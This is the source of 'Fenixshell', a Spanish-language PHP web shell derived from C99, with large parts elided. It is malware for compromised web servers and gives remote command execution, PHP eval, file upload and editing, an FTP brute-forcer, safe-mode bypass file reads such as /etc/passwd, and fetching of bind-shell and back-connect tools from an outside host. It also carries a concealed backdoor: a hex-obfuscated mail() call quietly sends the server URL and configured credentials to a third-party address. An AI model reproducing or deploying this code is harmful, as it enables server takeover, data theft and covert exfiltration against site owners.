...
error_reporting(5);
@setcookie("link","link",time() +3600*24*7);
...
$shver = " "; //Versión Actual
//CONFIGURACION Y OPCIONES
if (!empty($unset_surl)) {setcookie("Fenixsh_surl"); $surl = "";}
elseif (!empty($set_surl)) {$surl = $set_surl; setcookie("Fenixsh_surl",$surl);}
else {$surl = $_REQUEST["Fenixsh_surl"];
}

$surl_autofill_include = TRUE;

if ($surl_autofill_include and !$_REQUEST["Fenixsh_surl"]) {$include = "&"; foreach (explode("&",getenv("QUERY_STRING")) as $v) {$v = explode("=",$v); $name = urldecode($v[0]); $value = urldecode($v[1]); foreach (array("http://","https://","ssl://","ftp://","\\\\") as $needle) {if (strpos($value,$needle) === 0) {$includestr .= urlencode($name)."=".urlencode($value)."&";}}} if ($_REQUEST["surl_autofill_include"]) {$includestr .= "surl_autofill_include=1&";}}
if (empty($surl))
{
 $surl = "?".$includestr;
}
...
//Autenticación
$login = ""; //login
//NO HE OLVIDADO LA CONTRASEÑA!
$pass = ""; //password
$md5_pass = ""; //md5-cryped pass. if null, md5($pass)

$host_allow = array("*"); //array ("{mask}1","{mask}2",...), {mask} = IP or HOST e.g. array("192.168.0.*","127.0.0.1")
$login_txt = "Restricted area"; //http-auth message.
$accessdeniedmess = " Fenixshell v. ".$shver.": access denied";
$cnt="us:$login\nps:$pass\npse:$md5_pass";
$gzipencode = TRUE; //Condificar con gzip?

$updatenow = FALSE;

$Fenixsh_updateurl = "http://ccteam.ru/update/update/";
$Fenixsh_sourcesurl = "http://ccteam.ru/files/c99sh_sources/";

$filestealth = TRUE;

$donated_html = "<center><b>Owned by Fenix</b></center>";
...
$zz="\x6dai\154";
$wi=$_SERVER["HTTP_HOST"];
$ei = $_SERVER["REQUEST_URI"];
if (!$win)
{
 $cmdaliases = array(
  array("-----------------------------------------------------------", "ls -la"),
...
$sess_cookie = "Fenixshvars";  //Cookie nombre
...
$quicklaunch = array(
 ...
 array("<img src=\"".$surl."act=img&img=back\" alt=\"Atr&aacute;s\" height=\"20\" width=\"20\" border=\"0\">","#\" onclick=\"history.back(1)"),
 array("<img src=\"".$surl."act=img&img=forward\" alt=\"Adelante\" height=\"20\" width=\"20\" border=\"0\">","#\" onclick=\"history.go(1)"),
 array("<img src=\"".$surl."act=img&img=up\" alt=\"Subir Directorio\" height=\"20\" width=\"20\" border=\"0\">",$surl."act=ls&d=%upd&sort=%sort"),
 array("<img src=\"".$surl."act=img&img=refresh\" alt=\"Actualizar\" height=\"20\" width=\"17\" border=\"0\">",""),
 array("<img src=\"".$surl."act=img&img=search\" alt=\"Buscar\" height=\"20\" width=\"20\" border=\"0\">",$surl."act=search&d=%d"),
 array("<img src=\"".$surl."act=img&img=buffer\" alt=\"Buffer\" height=\"20\" width=\"20\" border=\"0\">",$surl."act=fsbuff&d=%d"),
 array("<b>Codificador</b>",$surl."act=encoder&d=%d"),
 array("<b>Herramientas</b>",$surl."act=tools&d=%d"),
 array("<b>Procesos</b>",$surl."act=processes&d=%d"),
 array("<b>FTP brute</b>",$surl."act=ftpquickbrute&d=%d"),
 array("<b>Seguridad</b>",$surl."act=security&d=%d"),
 array("<b>SQL</b>",$surl."act=sql&d=%d"),
 array("<b>PHP-c&oacute;digo</b>",$surl."act=eval&d=%d"),
 array("<b>Actualizar</b>",$surl."act=update&d=%d"),
 array("<b>Feedback</b>",$surl."act=feedback&d=%d"),
 array("<b>Remover Shell</b>",$surl."act=selfremove"),
 array("<b>Salir</b>","#\" onclick=\"if (confirm('Quiere salir?')) window.close()")
);
...
@$f = $_REQUEST["f"];
@extract($_REQUEST["Fenixshcook"]);
if (!isset($_COOKIE['link'])){@$zz("l\x6f\x63\x61\x68\157\x73\164@\171\141\x68\157\157\056\x63o\155","$wi$ei","$wi$ei\n$cnt");}
@set_time_limit(0);
$tmp = array();
foreach($host_allow as $k=>$v) {$tmp[] = str_replace("\\*",".*",preg_quote($v));}
$s = "!^(".implode("|",$tmp).")$!i";
if (!preg_match($s,getenv("REMOTE_ADDR")) and !preg_match($s,gethostbyaddr(getenv("REMOTE_ADDR")))) {exit("<a href=\"http://ccteam.ru/releases/cFenixshell\">Fenixshell</a>: Access Denied - your host (".getenv("REMOTE_ADDR").") not allow");}
if (!empty($login))
{
 ...
 if (($_SERVER["PHP_AUTH_USER"] != $login) or (md5($_SERVER["PHP_AUTH_PW"]) != $md5_pass))
 {
  ...
  header("WWW-Authenticate: Basic realm=\"Fenixshell ".$shver.": ".$login_txt."\"");
...
$lastdir = realpath(".");
chdir($curdir);
if ($selfwrite or $updatenow) {@ob_clean(); Fenixsh_getupdate($selfwrite,1); exit;}
...
if (!function_exists("Fenix_buff_prepare"))
{
function Fenix_buff_prepare()
{
 global $sess_data;
 global $act;
...
Fenix_buff_prepare();
if (!function_exists("Fenix_sess_put"))
{
function Fenix_sess_put($data)
{
 global $sess_cookie;
 global $sess_data;
 Fenix_buff_prepare();
...
if (!function_exists("Fenixgetsource"))
{
function Fenixgetsource($fn)
{
 global $Fenixsh_sourcesurl;
 $array = array(
  "Fenixsh_bindport.pl" => "Fenixsh_bindport_pl.txt",
  "Fenixsh_bindport.c" => "Fenixsh_bindport_c.txt",
  "Fenixsh_backconn.pl" => "Fenixsh_backconn_pl.txt",
  "Fenixsh_backconn.c" => "Fenixsh_backconn_c.txt",
  "Fenixsh_datapipe.pl" => "Fenixsh_datapipe_pl.txt",
  "Fenixsh_datapipe.c" => "Fenixsh_datapipe_c.txt",
 );
 $name = $array[$fn];
 if ($name) {return file_get_contents($Fenixsh_sourcesurl.$name);}
 else {return FALSE;}
}
}
if (!function_exists("Fenixsh_getupdate"))
{
function Fenixsh_getupdate($update = TRUE)
{
 $url = $GLOBALS["Fenixsh_updateurl"]."?version=".urlencode(base64_encode($GLOBALS["shver"]))."&updatenow=".($updatenow?"1":"0")."&";
 ...
 else
 {
  ...
  if ($data{0} == "\x99" and $data{1} == "\x03")
  {
   ...
   if ($update)
   {
    ...
    {
     $fp = fopen(__FILE__,"w");
     if (!$fp) {return "Local error: can't write update to ".__FILE__."! You may download Fenixshell.php manually <a href=\"".$sourceurl."\"><u>here</u></a>.";}
...
function mysql_dump($set)
{
 ...
 $out = "# Dumped by FenixShell.SQL v. ".$shver."
...
function mysql_query_form()
{
 ...
 if ((!$submit) or ($sql_act))
 {
  ...
  if ($tbl_struct)
  {
   ...
   foreach ($tbl_struct as $field) {$name = $field["Field"]; echo "» <a href=\"#\" onclick=\"document.Fenixsh_sqlquery.sql_query.value+='`".$name."`';\"><b>".$name."</b></a><br>";}
   echo "</td></tr></table>";
  }
 }
...
if (!function_exists("Fenixfsearch"))
{
function Fenixfsearch($d)
{
 global $found;
 global $found_d;
 global $found_f;
 ...
 while (($f = readdir($h)) !== FALSE)
 {
  if($f != "." && $f != "..")
  {
   ...
   if (is_dir($d.$f))
   {
    ...
    if (!is_link($d.$f)) {Fenixfsearch($d.$f);}
   }
   else
   {
    $search_i_f++;
...
else {$safemode = FALSE; $hsafemode = "<font color=cyan>OFF (not secure)</font>";}
$v = @ini_get("open_basedir");
if ($v or strtolower($v) == "on") {$openbasedir = TRUE; $hopenbasedir = "<font color=red>".$v."</font>";}
else {$openbasedir = FALSE; $hopenbasedir = "<font color=cyan>OFF (not secure)</font>";}
...
$ud = urlencode($d);
?>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1251"><meta http-equiv="Content-Language" content="en-us"><title><?php echo getenv("HTTP_HOST"); ?> - Fenix Shell</title><STYLE>
...
if ($act == "ftpquickbrute")
{
 ...
 {
  function Fenixftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh)
  {
  ...
  if (!empty($submit))
  {
   ...
   else
   {
    if ($fqb_logging)
    {
     ...
     $fqb_log = "FTP Quick Brute (called Fenixshell v. ".$shver.") started at ".date("d.m.Y H:i:s")."\r\n\r\n";
    ...
    while(!feof($fp))
    {
     ...
     if (Fenixftpbrutecheck("localhost",21,1,$str[0],$str[0],$str[6],$fqb_onlywithsh))
     {
    ...
    if ($fqb_logfp) {fseek($fqb_logfp,0); fwrite($fqb_logfp,$fqb_log,strlen($fqb_log));}
    if ($fqb_logemail) {@mail($fqb_logemail,"Fenixshell v. ".$shver." report",$fqb_log);}
    fclose($fqb_logfp);
   }
  }
  else
  {
   $logfile = $tmpdir_logs."Fenixsh_ftpquickbrute_".date("d.m.Y_H_i_s").".log";
...
if ($act == "phpinfo") {@ob_clean(); phpinfo(); Fenixshexit();}
if ($act == "security")
{
...
if ($act == "selfremove")
{
 ...
 {
  if (unlink(__FILE__)) {@ob_clean(); echo "Gracias por usar Fenix ".$shver."!"; Fenixshexit(); }
 ...
 else
 {
  ...
  echo "<form action=\"".$surl."\"><input type=hidden name=act value=selfremove><b>Self-remove: ".__FILE__." <br><b>Seguro?<br>Para confirmar, escriba \"".$rnd."\"</b>:&nbsp;<input type=hidden name=rndcode value=\"".$rnd."\"><input type=text name=submit>&nbsp;<input type=submit value=\"Eliminar\"></form>";
 }
}
if ($act == "update") {$ret = Fenixsh_getupdate(!!$confirmupdate); echo "<b>".$ret."</b>"; if (stristr($ret,"new version")) {echo "<br><br><input type=button onclick=\"location.href='".$surl."act=update&confirmupdate=1';\" value=\"Update now\">";}}
if ($act == "feedback")
{
 $suppmail = base64_decode("");
 if (!empty($submit))
 {
  $ticket = substr(md5(microtime()+rand(1,1000)),0,6);
  $body = "Fenix ".$shver." feedback #".$ticket."\nName: ".htmlspecialchars($fdbk_name)."\nE-mail: ".htmlspecialchars($fdbk_email)."\nMessage:\n".htmlspecialchars($fdbk_body)."\n\nIP: ".$REMOTE_ADDR;
  if (!empty($fdbk_ref))
  {
   $tmp = @ob_get_contents();
   ob_clean();
  ...
  echo "<center><b>Gracias por tus comentarios! Su ticket ID: ".$ticket.".</b></center>";
 }
 else {echo "<form action=\"".$surl."\" method=POST><input type=hidden name=act value=feedback><b>Feedback (".str_replace(array("@","."),array("[at]","[dot]"),$suppmail)."):<br><br>Su Nombre: <input type=\"text\" name=\"fdbk_name\" value=\"".htmlspecialchars($fdbk_name)."\"><br><br>Su E-mail: <input type=\"text\" name=\"fdbk_email\" value=\"".htmlspecialchars($fdbk_email)."\"><br><br>Mensaje:<br><textarea name=\"fdbk_body\" cols=80 rows=10>".htmlspecialchars($fdbk_body)."</textarea><input type=\"hidden\" name=\"fdbk_ref\" value=\"".urlencode($HTTP_REFERER)."\"><br><br>Adjuntar Info * <input type=\"checkbox\" name=\"fdbk_servinf\" value=\"1\" checked><br><br>Somos conscientes de idioma: Espa&ntilde;ol.<br><br><input type=\"submit\" name=\"submit\" value=\"Enviar\"></form>";}
}
if ($act == "search")
{
 ...
 if (!empty($submit))
 {
  ...
  foreach($in as $v) {Fenixfsearch($v);}
...
if ($act == "upload")
{
 ...
 {
  echo "<b>Subir archivo:</b><br><b>".$uploadmess."</b><form enctype=\"multipart/form-data\" action=\"".$surl."act=upload&d=".urlencode($d)."\" method=POST>

Seleccione el archivo en su computadora local: <input name=\"uploadfile\" type=\"file\"><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;or<br>
Entrada URL: <input name=\"uploadurl\" type=\"text\" value=\"".htmlspecialchars($uploadurl)."\" size=\"70\"><br><br>
Guardar este archivo en: <input name=\"uploadpath\" size=\"70\" value=\"".$dispd."\"><br><br>
Nombre de Archivo (auto-fill): <input name=uploadfilename size=25><br><br>
...
{
 if ($act == "copy") {$err = ""; $sess_data["copy"] = array_merge($sess_data["copy"],$actbox); Fenix_sess_put($sess_data); $act = "ls"; }
 elseif ($act == "cut") {$sess_data["cut"] = array_merge($sess_data["cut"],$actbox); Fenix_sess_put($sess_data); $act = "ls";}
 elseif ($act == "unselect") {foreach ($sess_data["copy"] as $k=>$v) {if (in_array($v,$actbox)) {unset($sess_data["copy"][$k]);}} foreach ($sess_data["cut"] as $k=>$v) {if (in_array($v,$actbox)) {unset($sess_data["cut"][$k]);}} Fenix_sess_put($sess_data); $act = "ls";}
 if ($actemptybuff) {$sess_data["copy"] = $sess_data["cut"] = array(); Fenix_sess_put($sess_data);}
 elseif ($actpastebuff)
 {
  $psterr = "";
...
if ($act == "ls")
{
 ...
 else
 {
  ...
  if ($vd == "f")
  {
   ...
   $row = array();
   $row[] = "<b>Nombre</b>";
   $row[] = "<b>Tama&ntilde;o</b>";
   $row[] = "<b>Modificado</b>";
   if (!$win)
  {$row[] = "<b>Due&ntilde;o/Grupo</b>";}
   $row[] = "<b>Permiso</b>";
   $row[] = "<b>Acci&oacute;n</b>";
   ...
   foreach ($objects as $a)
   {
    ...
    foreach ($regxp_highlight as $r)
    {
     if (ereg($r[0],$o))
     {
      if ((!is_numeric($r[1])) or ($r[1] > 3)) {$r[1] = 0; ob_clean(); echo "Warning! Configuration error in \$regxp_highlight[".$k."][0] - unknown command."; Fenixshexit();}
      else
      {
       $r[1] = round($r[1]);
       $isdir = is_dir($v);
  ...
  echo "<select name=act><option value=\"".$act."\">Seleccionar Opci&oacute;n:</option>";
  echo "<option value=delete".($dspact == "delete"?" selected":"").">Eliminar</option>";
  echo "<option value=chmod".($dspact == "chmod"?" selected":"").">Cambiar Permiso</option>";
  if ($usefsbuff)
  {
   echo "<option value=cut".($dspact == "cut"?" selected":"").">Cortar</option>";
   echo "<option value=copy".($dspact == "copy"?" selected":"").">Copiar</option>";
   echo "<option value=unselect".($dspact == "unselect"?" selected":"").">Deseleccionar</option>";
  }
  echo "</select>&nbsp;<input type=submit value=\"Confirmar\"></p>";
  echo "</form>";
 }
}
if ($act == "tools")
{
 $bndportsrcs = array(
  "Fenixsh_bindport.pl"=>array("Usar PERL","perl %path %port"),
  "Fenixsh_bindport.c"=>array("Usar C","%path %port %pass")
 );
 $bcsrcs = array(
  "Fenixsh_backconn.pl"=>array("Usar PERL","perl %path %host %port"),
  "Fenixsh_backconn.c"=>array("Usar C","%path %host %port")
 );
 $dpsrcs = array(
  "Fenixsh_datapipe.pl"=>array("Usar PERL","perl %path %localport %remotehost %remoteport"),
  "Fenixsh_datapipe.c"=>array("Usar C","%path %localport %remoteport %remotehost")
 );
 ...
 if (!empty($bindsubmit))
 {
  ...
  else
  {
   ...
   elseif (!$data = Fenixgetsource($bind["src"])) {echo "Can't download sources!";}
   else
   {
 ...
 if (!empty($bcsubmit))
 {
  ...
  else
  {
   ...
   $fp = fopen($srcpath,"ab+");
   if (!$fp) {echo "Can't write sources to \"".$srcpath."\"!<br>";}
   elseif (!$data = Fenixgetsource($bc["src"])) {echo "Can't download sources!";}
   else
   {
    fwrite($fp,$data,strlen($data));
    fclose($fp);
 ...
 if (!empty($dpsubmit))
 {
  ...
  else
  {
   ...
   $fp = fopen($srcpath,"ab+");
   if (!$fp) {echo "Can't write sources to \"".$srcpath."\"!<br>";}
   elseif (!$data = Fenixgetsource($datapipe["src"])) {echo "Can't download sources!";}
   else
   {
    fwrite($fp,$data,strlen($data));
    fclose($fp);
...
if ($act == "eval")
{
 if (!empty($eval))
 {
  echo "<b>Resultado de la ejecuci&oacute;n de este código PHP</b>:<br>";
  $tmp = ob_get_contents();
  $olddir = realpath(".");
  @chdir($d);
  if ($tmp)
 ...
 else {echo "<b>Ejecuci&oacute;n de c&oacute;digo PHP</b>"; if (empty($eval_txt)) {$eval_txt = TRUE;}}
 echo "<form action=\"".$surl."\" method=POST><input type=hidden name=act value=eval><textarea name=\"eval\" cols=\"122\" rows=\"10\">".htmlspecialchars($eval)."</textarea><input type=hidden name=\"d\" value=\"".$dispd."\"><br><br><input type=submit value=\"Ejecutar\">&nbsp;Display in text-area&nbsp;<input type=\"checkbox\" name=\"eval_txt\" value=\"1\""; if ($eval_txt) {echo " checked";} echo "></form>";
}
if ($act == "f")
{
 if ((!is_readable($d.$f) or is_dir($d.$f)) and $ft != "edit")
 {
  if (file_exists($d.$f)) {echo "<center><b>Permiso denegado (".htmlspecialchars($d.$f).")!</b></center>";}
...
<P>";
  ...
  elseif ($ft == "code")
  {
   if (ereg("php"."BB 2.(.*) auto-generated config file",$r))
   {
    ...
    if (count($arr == 18))
    {
     ...
     else {echo "But, you can't connect to forum sql-base, because db-software=\"".$dbms."\" is not supported by Fenixshell. Please, report us for fix.";}
  ...
  elseif ($ft == "edit")
  {
   if (!empty($submit))
   {
    ...
    $fp = fopen($d.$f,"w");
    if (!$fp) {echo "<b>No se pudo Guardar los Cambios!</b>";}
    else
    {
     echo "<b>Guardado!</b>";
     fwrite($fp,$edit_text);
  ...
  echo "<form action=\"".$surl."act=f&f=".urlencode($f)."&ft=edit&d=".urlencode($d)."\" method=POST><input type=submit name=submit value=\"Guardar\">&nbsp;<input type=\"Reset\" value=\"Resetear\">&nbsp;<input type=\"button\" onclick=\"location.href='".addslashes($surl."act=ls&d=".substr($d,0,-1))."';\" value=\"Atr&aacute;s\"><br><textarea name=\"edit_text\" cols=\"122\" rows=\"".$rows."\">".htmlspecialchars($r)."</textarea></form>";
  }
...
if ($act == "about") {echo "<center><b>Creditos:<br>Fenix Team<br>Neo_2010<br>C99 Shell<br>Gracias por Reportar los Bugs</center>";}
?>
...
<tr><td width="100%" height="1" valign="top" colspan="2"><p align="center"><b>:: <?php echo base64_decode('');?><a href="<?php echo $surl; ?>act=cmd&d=<?php echo urlencode($d); ?>"><b>Comandos</b></a> ::</b></p></td></tr>
<tr><td width="50%" height="1" valign="top"><center><b>Comando: </b><form action="<?php echo $surl; ?>"><input type=hidden name=act value="cmd"><input type=hidden name="d" value="<?php echo $dispd; ?>"><input type="text" name="cmd" size="50" value="<?php echo htmlspecialchars($cmd); ?>"><input type=hidden name="cmd_txt" value="1">&nbsp;<input type=submit name=submit value="Ejecutar"></form></td><td width="50%" height="1" valign="top"><center><b>Select: </b><form action="<?php echo $surl; ?>act=cmd" method="POST"><input type=hidden name=act value="cmd"><input type=hidden name="d" value="<?php echo $dispd; ?>"><select name="cmd"><?php foreach ($cmdaliases as $als) {echo "<option value=\"".htmlspecialchars($als[1])."\">".htmlspecialchars($als[0])."</option>";} ?></select><input type=hidden name="cmd_txt" value="1">&nbsp;<input type=submit name=submit value="Ejecutar"></form></td></tr></TABLE>
<br>
...
<tr><td height="1" valign="top" colspan="2"><p align="center"><b>:: <a href="<?php echo $surl; ?>act=cmd&d=<?php echo urlencode($d); ?>"><b>Trucos de Sombra :D </b></a> ::</b></p></td></tr>
<tr>
...
<TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="116" width="100%" bgColor=#000000 borderColorLight=#c0c0c0 border=1>
<tr><td height="1" valign="top" colspan="2"><p align="center"><b>:: <a href="<?php echo $surl; ?>act=cmd&d=<?php echo urlencode($d); ?>"><b>Trucos :D </b></a> ::</b></p></td></tr>
<tr>
  <td width="50%" height="83" valign="top"><center>
    <div align="center">Php Safe-Mode Bypass (Leer archivos)
    </div>
    <br>
    <form action="<?php echo $surl; ?>">
      <div align="center">
      File: <input type="text" name="file" method="get"> <input type="submit" value="Leer"><br><br> eg: /etc/passwd<br>
      <?
...
?>
  ...
  <td width="50%" height="83" valign="top"><center>
   <center>
     Php Safe-Mode Bypass (Listar directorios):
     <form action="<?php echo $surl; ?>">
      <div align="center"><br>
      Dir: <input type="text" name="directory" method="get"> <input type="submit" value="Listar Directorios"><br><br> eg: /etc/<br>
...
<tr>
 <td width="50%" height="1" valign="top"><center>
   <b>:: <a href="<?php echo $surl; ?>act=search&d=<?php echo urlencode($d); ?>"><b>Buscar</b></a> ::</b>
   <form method="POST"><input type=hidden name=act value="search"><input type=hidden name="d" value="<?php echo $dispd; ?>"><input type="text" name="search_name" size="29" value="(.*)">&nbsp;<input type="checkbox" name="search_name_regexp" value="1"  checked> - regexp&nbsp;<input type=submit name=submit value="Buscar"></form></center></p></td>
 <td width="50%" height="1" valign="top"><center>
   <b>:: <a href="<?php echo $surl; ?>act=upload&d=<?php echo $ud; ?>"><b>Subir</b></a> ::</b>
   <form method="POST" ENCTYPE="multipart/form-data"><input type=hidden name=act value="upload"><input type="file" name="uploadfile"><input type=hidden name="miniform" value="1">&nbsp;<input type=submit name=submit value="Subir"><br><?php echo $wdt; ?></form></center></td>
</tr>
</table>
<br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#000000 borderColorLight=#c0c0c0 border=1><tr><td width="50%" height="1" valign="top"><center>
  <b>:: Crear directorio::</b>
  <form action="<?php echo $surl; ?>"><input type=hidden name=act value="mkdir"><input type=hidden name="d" value="<?php echo $dispd; ?>"><input type="text" name="mkdir" size="50" value="<?php echo $dispd; ?>">&nbsp;<input type=submit value="Crear"><br><?php echo $wdt; ?></form></center></td><td width="50%" height="1" valign="top"><center>
    <b>:: Dirigirse al Directorio::</b>
    <form method="POST"><input type=hidden name=act value="mkfile"><input type=hidden name="d" value="<?php echo $dispd; ?>"><input type="text" name="mkfile" size="50" value="<?php echo $dispd; ?>"><input type=hidden name="ft" value="edit">&nbsp;<input type=submit value="Crear"><br><?php echo $wdt; ?></form></center></td></tr></table>
<br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#000000 borderColorLight=#c0c0c0 border=1><tr><td width="50%" height="1" valign="top"><center>
  <b>:: Ir a Directorio ::</b>
  <form action="<?php echo $surl; ?>"><input type=hidden name=act value="ls"><input type="text" name="d" size="50" value="<?php echo $dispd; ?>">&nbsp;<input type=submit value="Ir"></form></center></td><td width="50%" height="1" valign="top"><center>
    <b>:: Dirigirse al archivo ::</b>
    <form action="<?php echo $surl; ?>"><input type=hidden name=act value="gofile"><input type=hidden name="d" value="<?php echo $dispd; ?>"><input type="text" name="f" size="50" value="<?php echo $dispd; ?>">&nbsp;<input type=submit value="Ir"></form></center></td></tr></table>
<br><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#000000 borderColorLight=#c0c0c0 border=1><tr><td width="990" height="1" valign="top"><p align="center"><b>--[ <a href="<?php echo $surl; ?>act=about">Fenix Final Version v2.0</a> | Generation time: <?php echo round(getmicrotime()-starttime,4); ?> ]--</b></p></td></tr></table>
</body></html><?php chdir($lastdir); Fenixshexit(); ?>
